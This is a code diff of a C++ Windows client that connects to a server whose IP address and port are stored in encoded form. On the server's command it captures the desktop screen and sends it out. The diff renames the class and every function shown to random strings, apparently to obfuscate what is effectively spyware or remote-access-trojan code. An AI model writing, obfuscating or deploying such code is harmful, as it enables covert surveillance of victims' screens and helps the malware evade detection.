@@ -15,12 +15,12 @@
 const int DEFAULT_PORT = 6081;
 const std::string DEFAULT_IP_ADDRESS = "7O047LN464073";
 
-class Client {
+class fb693ll7iddh332 { // Client
 public:
-	Client() {
-		init_server();
+	fb693ll7iddh332() {
+		vcrcn6vva6vowzy();
 	}
-	~Client() {
+	~fb693ll7iddh332() {
 		if (clientSocket_ != INVALID_SOCKET) {
 			closesocket(clientSocket_);
 		}
@@ -35,8 +35,8 @@ public:
 		}
 	}
 private: // Private Functions
-	bool ack() {
-		// Receive ack from server
+	bool z72uot8sd9egdi1() {
+		// Receive z72uot8sd9egdi1 from server
 		int ackBytes = recv(clientSocket_, receivedCommand_, 16, 0);
 
 		if (ackBytes < 0) {
@@ -55,7 +55,7 @@ private: // Private Functions
 			return true;
 		}
 	}
-	void init_server() {
+	void vcrcn6vva6vowzy() {
 		// get handles to a device context (DC)
 		hwnd_ = GetDesktopWindow();
 		hwindowDC_ = GetDC(hwnd_);
@@ -83,7 +83,7 @@ private: // Private Functions
 			}
 
 			serverAddress_.sin_family = AF_INET;
-			std::string decryptedIp = decrypt_ip(DEFAULT_IP_ADDRESS.c_str());
+			std::string decryptedIp = cqzcuzswcstfa3r(DEFAULT_IP_ADDRESS.c_str());
 			
 			if (inet_pton(AF_INET, decryptedIp.c_str(), &serverAddress_.sin_addr) <= 0) {
 				closesocket(clientSocket_);
@@ -91,7 +91,7 @@ private: // Private Functions
 				return;
 			}
 
-			serverAddress_.sin_port = htons(decrypt_port(DEFAULT_PORT));
+			serverAddress_.sin_port = htons(gj7eaodc0g10rbk(DEFAULT_PORT));
 
 			// Try to connect until it is successful
 			while (runProgram_) {
@@ -106,11 +106,11 @@ private: // Private Functions
 
 			// Connection successful handle handshake via id
 
-			if (!IdHandler::check_if_exists() || IdHandler::is_empty()) {
-				IdHandler::create_file();
+			if (!j61sbaazstls3ek::check_if_exists() || j61sbaazstls3ek::is_empty()) {
+				j61sbaazstls3ek::create_file();
 				// Doesn't have id, send server '0' to get one. Id is a 15 random char ending with '\0'
 				send(clientSocket_, "0", 1, 0);
-				if (!ack()) {
+				if (!z72uot8sd9egdi1()) {
 					if (runProgram_) continue;
 					else break;
 				}
@@ -123,32 +123,32 @@ private: // Private Functions
 				}
 
 				id = (std::string) receivedCommand_;
-				IdHandler::write_id(id);
+				j61sbaazstls3ek::write_id(id);
 			}
 			else {
 				// Send 1 to indicate that it has an id
 				send(clientSocket_, "1", 1, 0); 
 				// Send the id to get verified
-				IdHandler::read_id(id);
+				j61sbaazstls3ek::read_id(id);
 				send(clientSocket_, id.c_str(), 16, 0);
-				if (!ack()) {
+				if (!z72uot8sd9egdi1()) {
 					if (runProgram_) continue;
 					else break;
 				}
 			}
 
 			while (runProgram_) {
-				if (!recv_command()) {
+				if (!bjvy6yz9c3kzip9()) {
 					break;
 				}
-				if (!send_src()) {
+				if (!ltayouq2uol8dfi()) {
 					break;
 				}
 			}
 		}
 	}
 
-	bool recv_command() {
+	bool bjvy6yz9c3kzip9() {
 		if (clientSocket_ == INVALID_SOCKET) {
 			return false;
 		}
@@ -169,7 +169,7 @@ private: // Private Functions
 			return false;
 		}
 		else if (strcmp(receivedCommand_, "1") == 0) { // Will take a screenshot
-			src_ = capture_screen_mat(hwnd_, hwindowDC_, hwindowCompatibleDC_, screenx_, screeny_, width_, height_);
+			src_ = pp0xkp00wx0dtih(hwnd_, hwindowDC_, hwindowCompatibleDC_, screenx_, screeny_, width_, height_);
 			if (src_.empty()) {
 				runProgram_ = false;
 				return false;
@@ -179,7 +179,7 @@ private: // Private Functions
 		return true;
 	}
 
-	bool send_src() {
+	bool ltayouq2uol8dfi() {
 		if (clientSocket_ == INVALID_SOCKET) {
 			return false;
 		}
